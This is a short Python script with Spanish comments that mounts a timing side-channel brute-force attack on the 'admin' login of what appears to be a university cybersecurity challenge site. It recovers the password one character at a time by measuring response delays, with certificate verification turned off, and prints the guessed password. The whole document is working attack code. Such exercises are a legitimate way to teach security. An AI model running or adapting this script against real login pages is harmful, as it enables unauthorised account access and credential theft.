#!/usr/bin/env python3
import time
import urllib3
import requests
import string

# 1) Desactivar avisos de certificado no verificado
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://viuciberseguridad.wsg127.com/retos/bruteforce2/index.php"
usuario = "admin"

# charset: minúsculas, mayúsculas, dígitos y símbolos comunes
charset = (
    string.ascii_lowercase
    + string.ascii_uppercase
    + string.digits
    + string.punctuation
)

longitud = 12  # ajusta según la longitud real de la contraseña
contrasena = ["?"] * longitud

session = requests.Session()
session.verify = False

for pos in range(longitud):
    mejor_tiempo = 0.0
    mejor_char = None

    for c in charset:
        # Construye un intento donde en la posición 'pos' ponemos 'c',
        # y el resto lo rellenamos con 'A' (o cualquier otro carácter fijo)
        intento = "".join(contrasena[:pos] + [c] + ["A"] * (longitud - pos - 1))
        params = {"login": usuario, "password": intento}

        t0 = time.time()
        try:
            r = session.get(URL, params=params, timeout=10)
        except requests.exceptions.RequestException:
            # Si hay error de red o timeout, espera un breve instante y continúa
            time.sleep(0.2)
            continue

        dt = time.time() - t0

        # Si no obtenemos 200 OK, reintentamos más adelante
        if r.status_code != 200:
            time.sleep(0.2)
            continue

        # Guardamos el carácter que produce mayor retraso
        if dt > mejor_tiempo:
            mejor_tiempo = dt
            mejor_char = c

    contrasena[pos] = mejor_char
    print(f"[+] Posición {pos + 1}: letra probable = '{mejor_char}' (tiempo ~{mejor_tiempo:.3f}s)")

print("Contraseña encontrada:", "".join(contrasena))

